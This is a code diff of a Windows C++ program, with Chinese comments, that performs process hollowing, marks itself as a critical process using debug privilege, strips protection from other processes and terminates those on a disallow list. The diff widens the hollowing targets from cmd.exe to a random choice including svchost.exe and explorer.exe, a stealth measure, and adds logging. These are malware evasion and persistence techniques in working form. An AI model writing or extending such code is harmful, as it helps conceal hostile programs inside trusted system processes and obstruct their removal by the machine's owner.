@@ -4,18 +4,19 @@
 #include <psapi.h>
 #include <string>
 #include <vector>
+#include <random>
 #include <map>
 #include <cctype>
 #include <algorithm>
 #include <fstream>
+#include <iostream>
 #include <cstring>
 #include <cstdarg>
 #include <ctime>
 
 #pragma comment(lib, "ntdll.lib")
-
 //-------------------------------------------------------------------
-// 日志函数 — 仅在 StartHollowProcess 内调用
+// 简单日志函数
 //-------------------------------------------------------------------
 static void Log(const char* format, ...)
 {
@@ -36,16 +37,21 @@ static void Log(const char* format, ...)
 }
 
 //-------------------------------------------------------------------
-// 唯一目标：cmd.exe
+// 目标进程
 //-------------------------------------------------------------------
 static const std::string target_hollow_processes[] = {
-    "C:\\Windows\\System32\\cmd.exe"
+    "C:\\Windows\\System32\\cmd.exe",
+    "C:\\Windows\\System32\\svchost.exe",
+    "C:\\Windows\\explorer.exe",
+    "C:\\Windows\\notepad.exe"
 };
-static const size_t HOLLOW_TARGET_COUNT = 1;
-
+static const size_t HOLLOW_TARGET_COUNT = 4;
 static int random_target_index()
 {
-    return 0;
+    // 静态局部变量：只初始化一次，且线程安全（C++11起）
+    static std::mt19937 rng(std::random_device{}());
+    static std::uniform_int_distribution<int> dist(0, 3);
+    return dist(rng);
 }
 
 //-------------------------------------------------------------------
@@ -77,9 +83,6 @@ typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
     PVOID BaseAddress
 );
 
-//-------------------------------------------------------------------
-// 进程镂空（仅此函数保留日志）
-//-------------------------------------------------------------------
 bool StartHollowProcess(const std::string& exe_path)
 {
     Log("StartHollowProcess: target = %s", exe_path.c_str());
@@ -240,7 +243,9 @@ bool StartHollowProcess(const std::string& exe_path)
             }
         }
 
-        // ---- 导入表修复（直接使用本地 DLL 基址） ----
+        // ========== 导入表修复 —— 直接使用本地 DLL 基址 ==========
+        // 原理：系统 DLL（kernel32, ntdll 等）在所有进程中映射到相同基址。
+        // 因此我们无需枚举远程模块，直接用本进程的 GetModuleHandle 结果即可。
         IMAGE_DATA_DIRECTORY importDir = localNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
         if (importDir.Size > 0)
         {
@@ -250,6 +255,7 @@ bool StartHollowProcess(const std::string& exe_path)
                 const char* dllName = (const char*)(localImage.data() + importDesc->Name);
                 Log("Processing import DLL: %s", dllName);
 
+                // 获取本地 DLL 基址（同时保证 DLL 已加载）
                 HMODULE localDllBase = GetModuleHandleA(dllName);
                 if (!localDllBase)
                 {
@@ -261,7 +267,8 @@ bool StartHollowProcess(const std::string& exe_path)
                     }
                 }
 
-                ULONGLONG remoteDllBase = (ULONGLONG)localDllBase; // 系统 DLL 基址全局相同
+                // 远程 DLL 基址与本地相同（系统 DLL 的会话级共享）
+                ULONGLONG remoteDllBase = (ULONGLONG)localDllBase;
 
                 PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localImage.data() + importDesc->FirstThunk);
                 PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(localImage.data() +
@@ -293,7 +300,7 @@ bool StartHollowProcess(const std::string& exe_path)
 
                     if (!remoteFuncAddr)
                     {
-                        Log("Error: could not resolve import");
+                        Log("Error: could not resolve import for ordinal/name");
                         goto cleanup;
                     }
 
@@ -421,7 +428,7 @@ BOOL ResumeProcess(int pid)
     return TRUE;
 }
 //-------------------------------------------------------------------
-// 以下函数均无任何日志输出
+// 获取当前进程路径（UTF-8）
 //-------------------------------------------------------------------
 std::string GetMyRunningProcessPath()
 {
@@ -444,6 +451,9 @@ std::string GetMyRunningProcessPath()
     return result;
 }
 
+//-------------------------------------------------------------------
+// 获取 NtSetInformationProcess 指针
+//-------------------------------------------------------------------
 static pfnNtSetInformationProcess GetNtSetInformationProcess()
 {
     static pfnNtSetInformationProcess pfn = NULL;
@@ -457,16 +467,23 @@ static pfnNtSetInformationProcess GetNtSetInformationProcess()
     return pfn;
 }
 
+//-------------------------------------------------------------------
+// 启用调试权限
+//-------------------------------------------------------------------
 BOOL EnableDebugPrivilege()
 {
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     LUID luid;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+    {
+        Log("EnableDebugPrivilege: OpenProcessToken failed (%d)", GetLastError());
         return FALSE;
+    }
     if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
     {
         CloseHandle(hToken);
+        Log("EnableDebugPrivilege: LookupPrivilegeValue failed (%d)", GetLastError());
         return FALSE;
     }
     tkp.PrivilegeCount = 1;
@@ -474,40 +491,74 @@ BOOL EnableDebugPrivilege()
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
     CloseHandle(hToken);
-    return (ret && GetLastError() == ERROR_SUCCESS);
+    if (!ret || GetLastError() != ERROR_SUCCESS)
+    {
+        Log("EnableDebugPrivilege: AdjustTokenPrivileges failed (%d)", GetLastError());
+        return FALSE;
+    }
+    return TRUE;
 }
 
+//-------------------------------------------------------------------
+// 标记为关键进程
+//-------------------------------------------------------------------
 BOOL ProtectMyself()
 {
     HMODULE hDll = LoadLibraryA("ntdll.dll");
     if (!hDll) return FALSE;
     pRtlSetProcessIsCritical RtlSetProcessIsCritical =
         (pRtlSetProcessIsCritical)GetProcAddress(hDll, "RtlSetProcessIsCritical");
-    if (!RtlSetProcessIsCritical) { FreeLibrary(hDll); return FALSE; }
-    if (!EnableDebugPrivilege()) { FreeLibrary(hDll); return FALSE; }
+    if (!RtlSetProcessIsCritical)
+    {
+        FreeLibrary(hDll);
+        return FALSE;
+    }
+    if (!EnableDebugPrivilege())
+    {
+        FreeLibrary(hDll);
+        return FALSE;
+    }
     NTSTATUS status = RtlSetProcessIsCritical(TRUE, NULL, FALSE);
     FreeLibrary(hDll);
+    if (status != 0) Log("ProtectMyself failed, status=0x%X", status);
     return (status == 0);
 }
 
+//-------------------------------------------------------------------
+// 移除关键保护
+//-------------------------------------------------------------------
 BOOL RemoveProtection(int pid)
 {
     pfnNtSetInformationProcess NtSetInformationProcess = GetNtSetInformationProcess();
     if (!NtSetInformationProcess) return FALSE;
     HANDLE hProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, (DWORD)pid);
-    if (!hProcess) return FALSE;
+    if (!hProcess)
+    {
+        Log("RemoveProtection: OpenProcess failed for PID %d (%d)", pid, GetLastError());
+        return FALSE;
+    }
     ULONG BreakOnTermination = 0;
-    NTSTATUS status = NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)0x1D,
-                                              &BreakOnTermination, sizeof(ULONG));
+    NTSTATUS status = NtSetInformationProcess(
+        hProcess,
+        (PROCESSINFOCLASS)0x1D,
+        &BreakOnTermination,
+        sizeof(ULONG)
+    );
     CloseHandle(hProcess);
+    if (!NT_SUCCESS(status))
+        Log("RemoveProtection: NtSetInformationProcess failed for PID %d, status=0x%X", pid, status);
     return NT_SUCCESS(status);
 }
 
+//-------------------------------------------------------------------
+// 枚举运行进程名
+//-------------------------------------------------------------------
 std::vector<std::string> getRunningProcess()
 {
     std::vector<std::string> processes;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+        return processes;
     PROCESSENTRY32W pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32W);
     if (Process32FirstW(hSnapshot, &pe32))
@@ -526,11 +577,15 @@ std::vector<std::string> getRunningProcess()
     return processes;
 }
 
+//-------------------------------------------------------------------
+// 根据进程名获取 PID
+//-------------------------------------------------------------------
 std::vector<int> getProcessPidByName(const std::string& procName)
 {
     std::vector<int> pids;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return pids;
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+        return pids;
     int wlen = MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, nullptr, 0);
     std::wstring wProcName(wlen - 1, L'\0');
     MultiByteToWideChar(CP_ACP, 0, procName.c_str(), -1, &wProcName[0], wlen);
@@ -547,13 +602,16 @@ std::vector<int> getProcessPidByName(const std::string& procName)
     return pids;
 }
 
+//-------------------------------------------------------------------
+// 获取当前进程 ID
+//-------------------------------------------------------------------
 int GetCurrentProcessIdWrapper()
 {
     return static_cast<int>(GetCurrentProcessId());
 }
 
 //-------------------------------------------------------------------
-// WinMain（少日志）
+// WinMain 调试版
 //-------------------------------------------------------------------
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nCmdShow)
@@ -569,6 +627,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     {
         // 清除环境变量，避免子进程继承后误判
         SetEnvironmentVariableA("XPT_DAEMON", NULL);
+
         Log("Running as daemon (via environment variable)");
 
         std::ifstream fin("C:\\Windows\\System32\\xptdea.dea");
@@ -733,15 +792,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         {
             if (disallow.find(procName) != disallow.end())
             {
+                Log("Found disallowed process: %s", procName.c_str());
                 auto pids = getProcessPidByName(procName);
                 for (int pid : pids)
                 {
                     if (pid == myPid) continue;
+                    Log("Killing PID %d (%s)", pid, procName.c_str());
                     RemoveProtection(pid);
                     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                     if (hProcess)
                     {
-                        TerminateProcess(hProcess, 1);
+                        if (TerminateProcess(hProcess, 1))
+                            Log("TerminateProcess success");
+                        else
+                            Log("TerminateProcess failed (%d)", GetLastError());
                         CloseHandle(hProcess);
                     } else {
                         Log("OpenProcess for terminate failed (%d)", GetLastError());
